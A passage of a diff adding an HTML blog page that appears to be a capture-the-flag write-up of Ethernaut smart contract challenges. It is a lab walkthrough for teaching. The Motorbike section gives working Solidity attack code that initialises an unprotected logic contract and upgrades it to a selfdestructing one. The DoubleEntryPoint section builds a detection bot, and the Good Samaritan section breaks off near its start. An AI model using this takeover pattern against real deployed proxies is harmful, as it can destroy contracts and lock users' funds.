+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;await web3.eth.getStorageAt(instance, 1);&lt;/code&gt; returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000000000000000000000009bdcf9696e273afd83992b1fb5672a70532ca9e1&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;(40-hex address zero-padded to 64 hex characters = 32bytes)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;motorbike&quot;&gt;Motorbike&lt;/h1&gt;
+
+&lt;p&gt;Proxy contracts use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt; on a logic contract so that business logic code is upgradeable without changing the proxy state.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is usually saved in a specific slot (for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;/code&gt;
+ in OpenZeppelin contracts) guaranteed to be never allocated by a compiler&lt;/li&gt;
+  &lt;li&gt;Note that the implementation slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;/code&gt; is not a coincidence.
+It is the keccak256 hash of “eip1967.proxy.implementation” minus 1
+    &lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//javascript&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strings_utils&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@ethersproject/strings&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@ethersproject/keccak256&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;strings_utils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toUtf8Bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eip1967.proxy.implementation&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//prints 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbd&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this challenge, we want to change the implementation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt; logic contract to a  malicious one (that contains the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELFDESTRUCT&lt;/code&gt; operation), using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgradeToAndCall()&lt;/code&gt; which requires us to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgrader&lt;/code&gt;. However, the only way to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgrader&lt;/code&gt; is via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt; implements &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Initializable&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize()&lt;/code&gt; can only be called once. Thankfully, we notice that the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize()&lt;/code&gt; in the Motorbike constructor is via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt;, which means that it only modifies the storage state of proxy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Motorbike&lt;/code&gt;, not the logic contract &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt; storage. In other words, we can still call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize()&lt;/code&gt; in the context of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt;’s state. In fact, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialized&lt;/code&gt; is still set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgrader&lt;/code&gt; is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt; state. This is the crux of the challenge: the proxy uses the implementation purely for logic and modifies only the storage within the proxy contract, since the proxy interacts with the logic implementation only via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt;. The takeaway here is to &lt;strong&gt;remember to initialise implementation contracts&lt;/strong&gt;!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get contract address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Engine&lt;/code&gt; , the logic contract that we want to selfdestruct via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast storage &amp;lt;challenge_addr&amp;gt; &amp;lt;IMPLEMENTATION_SLOT&amp;gt;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;deploy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackMotorbike&lt;/code&gt; contract, with input of Engine’s address. The attack consists of:&lt;/p&gt;
+    &lt;ol&gt;
+      &lt;li&gt;call Engine’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize()&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgradeToAndCall&lt;/code&gt; using calldata code of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selfdestruct&lt;/code&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;engineAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;initialize()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;engine could not be initialized&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;Destroy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;        
+    &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;selfDestruct()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;engineAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;upgradeToAndCall(address,bytes)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;upgrade to and call failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Destroy&lt;/code&gt; contract just needs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;selfdestruct&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Destroy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;selfDestruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;selfdestruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;payable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we can verify on Etherscan that the engine contract has been self-destructed.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;doubleentrypoint&quot;&gt;DoubleEntryPoint&lt;/h1&gt;
+
+&lt;p&gt;The vulnerability for this challenge is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CryptoVault&lt;/code&gt;’s function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sweepToken&lt;/code&gt; is supposed to prevent the token being swept from being the underlying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DET&lt;/code&gt; token: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require(token != underlying, &quot;Can&apos;t transfer underlying token&quot;);&lt;/code&gt; . However, this can be bypassed by simply calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sweepToken&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LegacyToken&lt;/code&gt; contract, whose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegate&lt;/code&gt; variable is indeed the underlying token &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DET&lt;/code&gt; so its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegate.delegateTransfer(to,value,msg.sender)&lt;/code&gt; call would sweep the entire Vault’s balance of underlying tokens &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DET&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sweptTokensRecipient&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;To prevent (or at least alert us of) this vulnerability, we implement a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DetectionBot&lt;/code&gt; contract to be set as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forta&lt;/code&gt;’s bot to detect when both:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegateTransfer(address, uint256, address)&lt;/code&gt; is called&lt;/li&gt;
+  &lt;li&gt;the caller of the above is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CryptoVault&lt;/code&gt; contract&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We initialise the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DetectionBot&lt;/code&gt; with these two parameters. Notice that the detection bot must also implement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleTransaction&lt;/code&gt;  called within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forta.notify()&lt;/code&gt; which handles whether &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forta&lt;/code&gt; should &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raiseAlert&lt;/code&gt; , raising the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;botRaisedAlerts[&amp;lt;detectionbot_address&amp;gt;]&lt;/code&gt; counter by one.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DetectionBot&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;refUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;refMsgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_refUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_refMsgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;refUser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_refUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;refMsgData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_refMsgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handleTransaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;calldata&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;        
+        &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functionSig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;origSender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;//check that origSender is the CryptoVault contract        
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;origSender&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;functionSig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refMsgData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;//the msg.sender (caller of DetectionBot.handleTransaction) is a Forta contract
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;IForta&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IForta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;forta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raiseAlert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The first 4 bytes of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.data&lt;/code&gt; msgData[:4] is simply the function signature when we call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegateTransfer&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;ie. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)&lt;/code&gt; = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x9cd1a121&lt;/code&gt; which is 4 bytes&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The remaining bytes of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.data&lt;/code&gt; can then be decoded into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(address to, uint256 value, address origSender)&lt;/code&gt; parameters. Crucially, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origSender&lt;/code&gt; address must match the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CryptoVault&lt;/code&gt; address we are tracking&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackDoubleEntryPoint.t.sol&lt;/code&gt;, which attempts to sweep the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DET&lt;/code&gt; balance from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CryptoVault&lt;/code&gt; after setting up the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DetectionBot&lt;/code&gt;,  the test should fail with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FAIL. Reason: Alert has been triggered, reverting&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Deploy DetectionBot contract, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;function_sig&amp;gt;&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x9cd1a121&lt;/code&gt; as discussed above&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create src/AttackDoubleEntryPoint.sol:DetectionBot --constructor-args &amp;lt;cryptoVault_address&amp;gt; &amp;lt;function_sig&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setDetectionBot&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forta&lt;/code&gt; contract&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;forta_address&amp;gt; &quot;setDetectionBot(address)&quot; &amp;lt;detectionbot_address&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;good-samaritan&quot;&gt;Good Samaritan&lt;/h1&gt;
+
+&lt;p&gt;We see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Coin&lt;/code&gt; contract is initialised with 1 million balance. Our goal is to drain all these tokens from the contract. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GoodSamaritan&lt;/code&gt; contract, we see that there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requestDonation()&lt;/code&gt; function which sends either 10 or all of the tokens to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt;. This is promising.&lt;/p&gt;
+
+&lt;ul&gt;
